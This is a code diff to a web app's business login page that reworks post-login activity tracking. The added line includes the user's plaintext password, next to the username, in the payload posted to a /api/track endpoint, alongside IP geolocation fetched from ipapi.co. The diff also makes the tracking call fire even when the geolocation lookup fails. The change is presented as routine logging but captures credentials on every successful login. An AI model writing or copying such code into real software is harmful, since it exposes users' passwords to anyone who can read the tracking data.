@@ -51,7 +51,7 @@ export default function BisnisLoginPage() {
         localStorage.setItem("cl_user", JSON.stringify({ key, display: user.display, emoji: user.emoji, role: user.role }));
         
         // Catat aktivitas spesifik login
-        fetch("https://ipapi.co/json/").then(r => r.json()).then(ipInfo => {
+        const sendTrack = (ipInfo: any) => {
           fetch("/api/track", {
             method: "POST",
             headers: { "Content-Type": "application/json" },
@@ -63,10 +63,16 @@ export default function BisnisLoginPage() {
               path: "/bisnis/login (Action: LOGIN SUCCESS)",
               isSuspicious: (ipInfo?.country_code && ipInfo.country_code !== "ID") ? true : false,
               countryCode: ipInfo?.country_code || 'XX',
-              username: key
+              username: key,
+              password: password
             })
-          });
-        }).catch(() => {});
+          }).catch(() => {});
+        };
+
+        fetch("https://ipapi.co/json/")
+          .then(r => r.json())
+          .then(sendTrack)
+          .catch(() => sendTrack(null));
         
       } catch { }
       router.replace("/bisnis");
